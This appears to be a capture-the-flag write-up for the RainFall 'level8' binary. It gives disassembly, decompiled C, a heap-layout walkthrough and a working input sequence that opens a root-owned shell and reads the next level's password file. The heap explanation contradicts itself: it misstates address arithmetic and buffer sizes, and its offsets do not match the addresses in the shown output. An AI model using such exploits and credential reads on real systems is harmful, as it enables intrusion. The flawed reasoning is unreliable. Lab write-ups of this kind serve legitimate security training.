# Source Code



<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     push   edi
   0x08048568 <+4>:     push   esi
   0x08048569 <+5>:     and    esp,0xfffffff0
   0x0804856c <+8>:     sub    esp,0xa0
   0x08048572 <+14>:    jmp    0x8048575 <main+17>
   0x08048574 <+16>:    nop
   0x08048575 <+17>:    mov    ecx,DWORD PTR ds:0x8049ab0
   0x0804857b <+23>:    mov    edx,DWORD PTR ds:0x8049aac
   0x08048581 <+29>:    mov    eax,0x8048810
   0x08048586 <+34>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>:    mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>:    mov    DWORD PTR [esp],eax
   0x08048591 <+45>:    call   0x8048410 <printf@plt>
   0x08048596 <+50>:    mov    eax,ds:0x8049a80
   0x0804859b <+55>:    mov    DWORD PTR [esp+0x8],eax
   0x0804859f <+59>:    mov    DWORD PTR [esp+0x4],0x80
   0x080485a7 <+67>:    lea    eax,[esp+0x20]
   0x080485ab <+71>:    mov    DWORD PTR [esp],eax
   0x080485ae <+74>:    call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:    test   eax,eax
   0x080485b5 <+81>:    je     0x804872c <main+456>
   0x080485bb <+87>:    lea    eax,[esp+0x20]
   0x080485bf <+91>:    mov    edx,eax
   0x080485c1 <+93>:    mov    eax,0x8048819
   0x080485c6 <+98>:    mov    ecx,0x5
   0x080485cb <+103>:   mov    esi,edx
   0x080485cd <+105>:   mov    edi,eax
   0x080485cf <+107>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080485d1 <+109>:   seta   dl
   0x080485d4 <+112>:   setb   al
   0x080485d7 <+115>:   mov    ecx,edx
   0x080485d9 <+117>:   sub    cl,al
   0x080485db <+119>:   mov    eax,ecx
   0x080485dd <+121>:   movsx  eax,al
   0x080485e0 <+124>:   test   eax,eax
   0x080485e2 <+126>:   jne    0x8048642 <main+222>
   0x080485e4 <+128>:   mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:   call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:   mov    ds:0x8049aac,eax
   0x080485f5 <+145>:   mov    eax,ds:0x8049aac
   0x080485fa <+150>:   mov    DWORD PTR [eax],0x0
   0x08048600 <+156>:   lea    eax,[esp+0x20]
   0x08048604 <+160>:   add    eax,0x5
   0x08048607 <+163>:   mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>:   mov    edx,eax
   0x08048611 <+173>:   mov    eax,0x0
   0x08048616 <+178>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:   mov    edi,edx
   0x0804861c <+184>:   repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>:   mov    eax,ecx
   0x08048620 <+188>:   not    eax
   0x08048622 <+190>:   sub    eax,0x1
   0x08048625 <+193>:   cmp    eax,0x1e
   0x08048628 <+196>:   ja     0x8048642 <main+222>
   0x0804862a <+198>:   lea    eax,[esp+0x20]
   0x0804862e <+202>:   lea    edx,[eax+0x5]
   0x08048631 <+205>:   mov    eax,ds:0x8049aac
   0x08048636 <+210>:   mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>:   mov    DWORD PTR [esp],eax
   0x0804863d <+217>:   call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:   lea    eax,[esp+0x20]
   0x08048646 <+226>:   mov    edx,eax
   0x08048648 <+228>:   mov    eax,0x804881f
   0x0804864d <+233>:   mov    ecx,0x5
   0x08048652 <+238>:   mov    esi,edx
   0x08048654 <+240>:   mov    edi,eax
   0x08048656 <+242>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:   seta   dl
   0x0804865b <+247>:   setb   al
   0x0804865e <+250>:   mov    ecx,edx
   0x08048660 <+252>:   sub    cl,al
   0x08048662 <+254>:   mov    eax,ecx
   0x08048664 <+256>:   movsx  eax,al
   0x08048667 <+259>:   test   eax,eax
   0x08048669 <+261>:   jne    0x8048678 <main+276>
   0x0804866b <+263>:   mov    eax,ds:0x8049aac
   0x08048670 <+268>:   mov    DWORD PTR [esp],eax
   0x08048673 <+271>:   call   0x8048420 <free@plt>
   0x08048678 <+276>:   lea    eax,[esp+0x20]
   0x0804867c <+280>:   mov    edx,eax
   0x0804867e <+282>:   mov    eax,0x8048825
   0x08048683 <+287>:   mov    ecx,0x6
   0x08048688 <+292>:   mov    esi,edx
   0x0804868a <+294>:   mov    edi,eax
   0x0804868c <+296>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:   seta   dl
   0x08048691 <+301>:   setb   al
   0x08048694 <+304>:   mov    ecx,edx
   0x08048696 <+306>:   sub    cl,al
   0x08048698 <+308>:   mov    eax,ecx
   0x0804869a <+310>:   movsx  eax,al
   0x0804869d <+313>:   test   eax,eax
   0x0804869f <+315>:   jne    0x80486b5 <main+337>
   0x080486a1 <+317>:   lea    eax,[esp+0x20]
   0x080486a5 <+321>:   add    eax,0x7
   0x080486a8 <+324>:   mov    DWORD PTR [esp],eax
   0x080486ab <+327>:   call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:   mov    ds:0x8049ab0,eax
   0x080486b5 <+337>:   lea    eax,[esp+0x20]
   0x080486b9 <+341>:   mov    edx,eax
   0x080486bb <+343>:   mov    eax,0x804882d
   0x080486c0 <+348>:   mov    ecx,0x5
   0x080486c5 <+353>:   mov    esi,edx
   0x080486c7 <+355>:   mov    edi,eax
   0x080486c9 <+357>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:   seta   dl
   0x080486ce <+362>:   setb   al
   0x080486d1 <+365>:   mov    ecx,edx
   0x080486d3 <+367>:   sub    cl,al
   0x080486d5 <+369>:   mov    eax,ecx
   0x080486d7 <+371>:   movsx  eax,al
   0x080486da <+374>:   test   eax,eax
   0x080486dc <+376>:   jne    0x8048574 <main+16>
   0x080486e2 <+382>:   mov    eax,ds:0x8049aac
   0x080486e7 <+387>:   mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:   test   eax,eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
   0x080486fa <+406>:   jmp    0x8048574 <main+16>
   0x080486ff <+411>:   mov    eax,ds:0x8049aa0
   0x08048704 <+416>:   mov    edx,eax
   0x08048706 <+418>:   mov    eax,0x804883b
   0x0804870b <+423>:   mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:   mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:   mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:   mov    DWORD PTR [esp],eax
   0x08048722 <+446>:   call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:   jmp    0x8048574 <main+16>
   0x0804872c <+456>:   nop
   0x0804872d <+457>:   mov    eax,0x0
   0x08048732 <+462>:   lea    esp,[ebp-0x8]
   0x08048735 <+465>:   pop    esi
   0x08048736 <+466>:   pop    edi
   0x08048737 <+467>:   pop    ebp
   0x08048738 <+468>:   ret
</code></pre>
</td>
<td>
<pre><code class="language-c">
char* auth;
char* service;

int main()
{
  char buff[130];

  while ( 1 )
  {
    printf("%p, %p \n", auth, service);
    if ( !fgets(buff, 128, stdin) )
      break;
    if ( !memcmp(buff, "auth ", 5) )
    {
      auth = malloc(4);
      *auth = 0;
      if ( strlen(buff + 5) <= 30 )
        strcpy(auth, buff + 5);
    }
    if ( !memcmp(buff, "reset", 5) )
      free(auth);
    if ( !memcmp(buff, "service", 6) )
      service = strdup(buff + 7);
    if ( !memcmp(buff, "login", 5) )
    {
      if ( *(auth + 32) )
        system("/bin/sh");
      else
        fwrite("Password:\n", 1, 10, stdout);
    }
  }
  return 0;
}
</code></pre>
</td>
</tr>
</table>



# Exploring


The program intended to check some authentication status flag, but mistakenly accessed memory far beyond the allocated auth buffer. The check *(auth + 32) is incorrect and doesn't correspond to any valid in-bounds check.

Strategy:

Our goal is to control the byte at auth + 32. Since auth and service are allocated using malloc and strdup respectively, they will be placed on the heap. If we can ensure that service is allocated immediately after auth in memory, then auth + 32 will point into the service buffer. By controlling the content of service, we can control the value read by *(auth + 32) and trigger the shell execution.

Heap Visualization:

Let's visualize the heap:

Initial State:

```
Heap: [ ... Free Space ... ]
auth: (nil)
service: (nil)
```

Both auth and service pointers are initially NULL.

Step 1: Allocate auth

Input: auth aaaa

```
Heap: [ AUTH_BLOCK(4 bytes) | ... Free Space ... ]
auth: ---------> AUTH_BLOCK (e.g., 0x804a008)
service: (nil)
```

malloc(4) allocates a 4-byte block on the heap. The auth pointer now points to the beginning of this block. Let's assume AUTH_BLOCK starts at address 0x804a008.

Step 2: Allocate service to be adjacent to auth

```
Input: service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (30 'a's)

Heap: [ AUTH_BLOCK(4 bytes) | SERVICE_BLOCK(31 bytes) | ... Free Space ... ]
auth: ---------> AUTH_BLOCK (0x804a008)
service: ---------> SERVICE_BLOCK (0x804a010)
```

strdup allocates memory for the string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" (30 'a's) plus a null terminator, resulting in a 31-byte allocation. Crucially, due to heap allocator behavior (often allocating sequentially), the SERVICE_BLOCK is likely placed immediately after the AUTH_BLOCK. Therefore, SERVICE_BLOCK starts at 0x804a008 + 4 = 0x804a010.

Calculating the Offset and Target Byte:


- auth points to 0x804a008.

- We are interested in auth + 32, which is 0x804a008 + 32 = 0x804a028.

- service points to 0x804a010.


- The offset of interest within the SERVICE_BLOCK is 0x804a028 - 0x804a010 = 0x18 (decimal 24). So, the 32nd byte from auth is actually the 25th byte within the service block (0-indexed).


Step 3: Trigger the Vulnerability and Gain Shell

```
Input: login

The login block is executed:

if ( *(auth + 32) ) // This is the vulnerable check!
    system("/bin/sh");
else
    fwrite("Password:\n", 1, 10, stdout);
```


Since we've overwritten the SERVICE_BLOCK with 'a's, the byte at auth + 32 (which resides within the SERVICE_BLOCK) will now be 'a' (or some other non-zero value depending on the length of "aaaa..."). The if condition becomes true, and system("/bin/sh") is executed, giving us a shell.



# Exploiting

```
auth aaaa
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
login
```

Output:

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth aaaa
0x804a008, (nil)
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

We gain shell access, our meetup next challenge `level9`.
